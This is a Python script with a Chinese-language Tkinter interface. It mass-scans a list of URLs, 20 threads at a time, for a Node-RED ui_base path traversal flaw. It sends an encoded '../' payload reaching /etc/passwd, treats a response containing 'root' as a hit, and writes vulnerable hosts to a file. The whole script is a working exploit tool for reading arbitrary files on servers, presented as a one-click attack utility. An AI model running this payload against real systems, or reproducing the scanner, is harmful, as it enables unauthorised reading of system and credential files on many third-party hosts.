import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def node_red_anyfile_read_exp(url):
    poc = r"""/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"""
    url = url + poc
    try:
        res = requests.get(url, verify=False,timeout=3)
        if "root" in res.text:
            node_red_anyfile_read_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            node_red_anyfile_read_text.see(END)
            with open ("存在Node-RED ui_base 任意文件读取漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            node_red_anyfile_read_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            node_red_anyfile_read_text.see(END)
    except Exception as err:
        node_red_anyfile_read_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        node_red_anyfile_read_text.see(END)
def get_node_red_anyfile_read_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def node_red_anyfile_read_gui():
    node_red_anyfile_read = tk.Tk()
    node_red_anyfile_read.geometry("910x450")
    node_red_anyfile_read.title("Node-RED ui_base 任意文件读取漏洞一把梭")
    node_red_anyfile_read.resizable(0, 0)
    node_red_anyfile_read.iconbitmap('logo.ico')
    global node_red_anyfile_read_text
    node_red_anyfile_read_text = scrolledtext.ScrolledText(node_red_anyfile_read,width=123, height=25)
    node_red_anyfile_read_text.grid(row=0, column=0, padx=10, pady=10)
    node_red_anyfile_read_text.see(END)
    addrs = get_node_red_anyfile_read_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(node_red_anyfile_read_exp, addr)
    node_red_anyfile_read.mainloop()